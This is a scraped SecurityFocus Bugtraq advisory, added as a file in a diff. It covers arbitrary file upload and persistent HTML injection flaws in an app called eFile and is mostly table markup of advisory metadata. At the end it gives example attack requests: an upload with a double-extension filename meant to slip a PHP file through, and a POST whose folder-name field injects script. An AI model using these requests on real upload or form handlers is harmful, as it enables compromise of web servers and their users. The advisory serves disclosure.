@@ -1,0 +1,93 @@
+#SpeeDr00t@Black Falcon<br>#bid60839<p><b><span style="font-size: 18pt;">eFile Arbitrary File Upload and Multiple HTML Injection Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/60839/info">info</a><br><a href="http://www.securityfocus.com/bid/60839/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/60839/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/60839/solution">solution</a><br><a href="http://www.securityfocus.com/bid/60839/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				60839
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jun 28 2013 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jun 28 2013 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Benjamin Kunz Mejri
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An attacker can exploit these issues through a browser. <br/><br/>The following example requests are available:<br/><br/>File Upload:<br/><br/>Host=localhost:8080<br/>User-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0<br/>Accept=text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br/>Accept-Language=en-US,en;q=0.5<br/>Accept-Encoding=gzip, deflate<br/>DNT=1<br/>X-Requested-With=XMLHttpRequest<br/>X-File-Name=1234.png.txt.iso.php.gif<br/>Content-Type=application/octet-stream<br/>Referer=http://localhost:8080/<br/>Content-Length=98139<br/>POSTDATA =?PNGX<br/><br/>HTML-injection:<br/><br/>POST http://localhost:8080/# Load FlagsLOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI   <br/>Content Size-1 Mime Typeapplication/x-unknown-content-type<br/>Request Headers:<br/>Hostlocalhost:8080<br/>User-AgentMozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0<br/>Accepttext/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br/>Accept-Languageen-US,en;q=0.5<br/>Accept-Encodinggzip, deflate<br/>DNT1<br/>Refererhttp://localhost:8080/<br/>Connectionkeep-alive<br/>Post Data:<br/>newFolder%2520%3E%22%3CPERSISTENT INJECTED SCRIPT CODE!+src%3Da%3E<br/>submitButtonCreate
+	
+		<ul>
+</ul>
+</div>
